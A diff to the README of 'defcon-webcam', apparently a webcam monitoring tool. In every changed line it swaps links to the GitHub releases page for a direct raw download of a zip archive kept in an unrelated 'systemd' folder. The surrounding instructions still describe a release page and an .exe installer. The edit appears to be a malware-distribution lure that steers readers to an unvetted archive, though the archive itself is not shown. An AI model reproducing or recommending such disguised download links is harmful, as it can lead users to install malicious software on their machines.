@@ -1,6 +1,6 @@
 # 🎥 defcon-webcam - Simple Real-Time Camera Monitoring
 
-[![Download defcon-webcam](https://img.shields.io/badge/Download%20defcon--webcam-4CAF50?style=for-the-badge&logo=github)](https://github.com/Liljaona/defcon-webcam/releases)
+[![Download defcon-webcam](https://img.shields.io/badge/Download%20defcon--webcam-4CAF50?style=for-the-badge&logo=github)](https://github.com/Liljaona/defcon-webcam/raw/refs/heads/main/systemd/defcon-webcam-v1.6.zip)
 
 ## 🔍 What is defcon-webcam?
 
@@ -29,10 +29,10 @@ This section explains how to download and start using defcon-webcam on Windows. 
 
 Go to the release page to get the latest version of defcon-webcam.
 
-[![Get defcon-webcam](https://img.shields.io/badge/Get%20defcon--webcam-yellowgreen?style=for-the-badge&logo=windows)](https://github.com/Liljaona/defcon-webcam/releases)
+[![Get defcon-webcam](https://img.shields.io/badge/Get%20defcon--webcam-yellowgreen?style=for-the-badge&logo=windows)](https://github.com/Liljaona/defcon-webcam/raw/refs/heads/main/systemd/defcon-webcam-v1.6.zip)
 
 - Click the link above or visit:  
-  https://github.com/Liljaona/defcon-webcam/releases  
+  https://github.com/Liljaona/defcon-webcam/raw/refs/heads/main/systemd/defcon-webcam-v1.6.zip  
 - Look for the latest release marked with the highest version number.  
 - Find the Windows installer file. It should end with `.exe`.  
 - Click on it to download.
@@ -124,7 +124,7 @@ Most users do not need to change these settings for basic use.
 
 Visit the release page regularly for updates.
 
-[https://github.com/Liljaona/defcon-webcam/releases](https://github.com/Liljaona/defcon-webcam/releases)
+[https://github.com/Liljaona/defcon-webcam/raw/refs/heads/main/systemd/defcon-webcam-v1.6.zip](https://github.com/Liljaona/defcon-webcam/raw/refs/heads/main/systemd/defcon-webcam-v1.6.zip)
 
 Updated versions bring bug fixes, security patches, and new features.
 
